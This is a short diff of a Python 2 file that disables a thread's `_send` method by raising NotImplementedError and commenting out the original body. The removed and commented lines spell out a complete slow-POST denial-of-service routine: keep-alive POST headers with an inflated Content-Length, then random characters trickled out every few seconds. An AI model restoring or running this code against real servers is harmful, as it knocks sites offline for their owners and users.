@@ -41,30 +41,30 @@ class smtp(Thread):
 
 
     def _send(self, pause=10):
-        global stop_now
+        raise NotImplementedError
 
-        # connect
-        self.socks.send("POST / HTTP/1.1\r\n"
-                        "Host: %s\r\n"
-                        "User-Agent: %s\r\n"
-                        "Connection: keep-alive\r\n"
-                        "Keep-Alive: 900\r\n"
-                        "Content-Length: 10000\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
-                        (self.host, random.choice(self.user_agents)))
-
-        # slow post attachment
-        for i in range(0, 9999):
-            if stop_now:
-                self.running = False
-                break
-            p = random.choice(string.letters+string.digits)
-            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
-            self.socks.send(p)
-            time.sleep(random.uniform(0.1, 3))
-
-        # bye
-        self.socks.close()
+        # global stop_now
+        #
+        # self.socks.send("POST / HTTP/1.1\r\n"
+        #                 "Host: %s\r\n"
+        #                 "User-Agent: %s\r\n"
+        #                 "Connection: keep-alive\r\n"
+        #                 "Keep-Alive: 900\r\n"
+        #                 "Content-Length: 10000\r\n"
+        #                 "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
+        #                 (self.host, random.choice(self.user_agents)))
+        #
+        # # slow post attachment
+        # for i in range(0, 9999):
+        #     if stop_now:
+        #         self.running = False
+        #         break
+        #     p = random.choice(string.letters+string.digits)
+        #     print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
+        #     self.socks.send(p)
+        #     time.sleep(random.uniform(0.1, 3))
+        #
+        # self.socks.close()
 
     def run(self):
         while self.running:
